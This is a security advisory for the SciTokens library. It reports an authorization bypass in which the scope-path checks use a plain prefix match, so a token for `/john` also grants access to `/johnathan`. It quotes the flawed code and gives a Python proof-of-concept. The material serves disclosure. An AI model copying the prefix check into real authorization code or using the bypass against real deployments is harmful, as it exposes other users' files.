summary: "SciTokens has an Authorization Bypass via Incorrect Scope Path Prefix Checking\n###\
  \ Summary\nThe `Enforcer` incorrectly validates scope paths by using a simple prefix match\
  \ (`startswith`). This allows a token with access to a specific path (e.g., `/john`) to also\
  \ access sibling paths that start with the same prefix (e.g., `/johnathan`, `/johnny`), which\
  \ is an **Authorization Bypass**.\n\n### Details\n**File:** `src/scitokens/scitokens.py` \
  \ \n**Methods:** `_validate_scp` and `_validate_scope`\n\n### Vulnerable Code Snippets:\n\n\
  **In `_validate_scp` (around line 696):**\n```python\n    for scope in value:\n        authz,\
  \ norm_path = self._check_scope(scope)\n        if (self._test_authz == authz) and norm_requested_path.startswith(norm_path):\n\
  \            return True\n```\n\n**In `_validate_scope` (around line 722):**\n```python\n\
  \    for scope in value.split(\" \"):\n        authz, norm_path = self._check_scope(scope)\n\
  \        if (self._test_authz == authz) and norm_requested_path.startswith(norm_path):\n \
  \           return True\n```\n\nIf `norm_path` (authorized) is `/john` and `norm_requested_path`\
  \ (requested) is `/johnathan`, `startswith` returns `True`, incorrectly granting access.\n\
  \n### PoC\n```\n\nimport scitokens\nimport sys\n\ndef poc_scope_bypass():\n    \"\"\"\n  \
  \  Demonstrate an Authorization Bypass vulnerability in scope path checking.\n    \"\"\"\n\
  \    print(\"--- PoC: Incorrect Scope Path Checking (Authorization Bypass) ---\")\n    \n\
  \    issuer = \"https://scitokens.org/unittest\"\n    enforcer = scitokens.Enforcer(issuer)\n\
  \    \n    # Create a token with access to /john\n    token = scitokens.SciToken()\n    token['iss']\
  \ = issuer\n    token['scope'] = \"read:/john\"\n    \n    print(f\"Authorized path in scope:\
  \ /john\")\n    \n    # 1. Test access to /john/file (should be allowed)\n    print(f\"[1]\
  \ Testing legitimate subpath: /john/file\")\n    if enforcer.test(token, 'read', '/john/file'):\n\
  \        print(\"    -> Access GRANTED (Correct behavior)\")\n    else:\n        print(\"\
  \    -> Access DENIED (Incorrect behavior - should have access to subpaths)\")\n\n    # 2.\
  \ Test access to /johnathan (SHOULD BE DENIED)\n    print(f\"[2] Testing illegitimate sibling\
  \ path: /johnathan\")\n    if enforcer.test(token, 'read', '/johnathan'):\n        print(\"\
  \    -> [VULNERABILITY] Access GRANTED! This is an authorization bypass.\")\n    else:\n \
  \       print(\"    -> Access DENIED (Correct behavior - fix is working)\")\n\n    # 3. Test\
  \ access to /johnny (SHOULD BE DENIED)\n    print(f\"[3] Testing illegitimate sibling path:\
  \ /johnny\")\n    if enforcer.test(token, 'read', '/johnny'):\n        print(\"    -> [VULNERABILITY]\
  \ Access GRANTED! This is an authorization bypass.\")\n    else:\n        print(\"    -> Access\
  \ DENIED (Correct behavior - fix is working)\")\n\nif __name__ == \"__main__\":\n    # Ensure\
  \ scitokens from src/ is available\n    sys.path.insert(0, \"src\")\n    poc_scope_bypass()\n\
  \n```\n### Impact\nThis bug allows a user to access resources they are not authorized for.\
  \ For example, if a system uses usernames as top-level directories in a shared storage, a\
  \ user `john` might be able to read or write to the directory of user `johnathan` simply because\
  \ their names share a prefix."
